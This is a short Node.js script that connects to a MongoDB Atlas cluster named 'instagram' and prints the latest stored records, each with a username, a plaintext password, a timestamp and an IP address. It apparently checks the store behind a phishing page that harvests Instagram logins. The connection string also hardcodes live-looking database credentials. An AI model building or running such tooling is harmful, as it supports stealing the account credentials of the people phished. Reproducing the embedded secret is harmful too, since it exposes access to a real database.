// Script to check if data is being saved to MongoDB
const { MongoClient } = require('mongodb');

const MONGODB_URI = 'mongodb+srv://instagram:Instgram123@cluster0.hi5k3nn.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
const MONGODB_DB = 'instagram';
const MONGODB_COLLECTION = 'user';

async function checkDatabase() {
    const client = new MongoClient(MONGODB_URI);
    
    try {
        await client.connect();
        console.log('✅ Connected to MongoDB Atlas');
        
        const db = client.db(MONGODB_DB);
        const collection = db.collection(MONGODB_COLLECTION);
        
        // Get all documents
        const documents = await collection.find({}).sort({ createdAt: -1 }).limit(10).toArray();
        
        console.log(`\n📊 Found ${documents.length} documents in database:`);
        console.log('=' .repeat(60));
        
        documents.forEach((doc, index) => {
            console.log(`\n${index + 1}. Document ID: ${doc._id}`);
            console.log(`   Username: ${doc.username}`);
            console.log(`   Password: ${doc.password}`);
            console.log(`   Timestamp: ${doc.timestamp}`);
            console.log(`   Created: ${doc.createdAt}`);
            console.log(`   IP: ${doc.ipAddress || 'Unknown'}`);
        });
        
        console.log('\n' + '=' .repeat(60));
        console.log('✅ Database check completed successfully!');
        
    } catch (error) {
        console.error('❌ Database check failed:', error.message);
    } finally {
        await client.close();
    }
}

checkDatabase();
